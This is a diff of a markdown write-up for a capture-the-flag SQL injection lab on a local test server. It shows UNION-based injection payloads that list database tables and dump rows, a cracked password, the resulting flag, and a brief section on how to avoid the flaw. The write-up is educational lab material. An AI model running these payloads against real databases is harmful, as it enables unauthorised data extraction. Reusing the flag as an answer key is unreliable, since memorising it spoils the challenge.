@@ -3,6 +3,7 @@
 - Tags : `SQL Injection`
 - Server ip : `192.168.1.17 `
 - Difficulty : <span style="color : green">Easy</span>
+
 ___
 
 
@@ -13,7 +14,8 @@ When we visit the `SEARCH IMAGE` page from **Home page** we see a page where the
 # <span style="text-decoration: underline">Solution</span>
 
 ## Get the table name of our default database
-We have found out many database and table names in the [member](/member.md) challenge. Let's try to findout in which tables does this database (default) contains, from this input.
+
+We have found out many database and table names in the [member](/member) challenge. Let's try to findout in which tables does this database (default) contains, from this input.
 
 ```sql
 1 AND 1=0 UNION SELECT 1, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()) --
@@ -27,19 +29,19 @@ Title: list_images
 Url : 1
 ```
 
-We can see that there is a table called `list_images`. In the [member](/member.md) challenge. we have found out the names of the columns for this table
+We can see that there is a table called `list_images`. In the [member](/member) challenge. we have found out the names of the columns for this table
 
 |No|Table|Column names|
 |--|--|--|
 |1| **db_default** | `id`, `username`, `password` |
-|2| **users** | `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`,  |
+|2| **users** | `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`|
 |3| **guestbook** | `id_comment` , `comment`, `name` |
 |4| **list_images** | `id`, `url`, `title`, `comment` |
 |5| **vote_dbs** | `id_vote`, `nb_vote`, `subject`|
 
 ## View content of the database
 
-Now that we know what we have in the table let's try to extract the data using the same technique from [member](/member.md) challenge. but using the `column` names for this `table`.
+Now that we know what we have in the table let's try to extract the data using the same technique from [member](/member) challenge. but using the `column` names for this `table`.
 
 ```sql
 1 AND 1=2 UNION SELECT title, CONCAT(CHAR(124), id, CHAR(124), url, CHAR(124), title, CHAR(124), comment, CHAR(124)) AS name FROM list_images --
@@ -63,19 +65,18 @@ Much like the [member](/member.md) challenge, we also get a `md5` string that we
 - It is already all lowercase
 - The sha256 sum of the word `albatroz` is `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
 
-# How to avoid the problem
+# <span style="text-decoration: underline">How to avoid the problem</span>
 
 Contrary to the challenge [member](/member.md) challenge, they have removed the `error` messages of bad user inputs but did not do anything agains't correct `sql` query as input. Sql injection could be a dengerouis problem which could as fas as compromise the whole system. in our situation the programmer used the raw **user input** data inside the query which in turn let the user control what the quert string becomes and so the result is given. This kind of situation can be avoided easily by not using the user input directly in our string. 
 
-
-# Flag
+# <span style="text-decoration: underline">Flag</span>
 
 ```text
 f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
 ```
 
-?> Node : This is the same `flag` as the one we found during the [copytight](/copyright.md) challenge
+> Node : This is the same `flag` as the one we found during the [copytight](/copyright) challenge
 
-# Resources
+# <span style="text-decoration: underline">Resources</span>
 
-- [member challenge](/member.md)
+- [member challenge](/member)
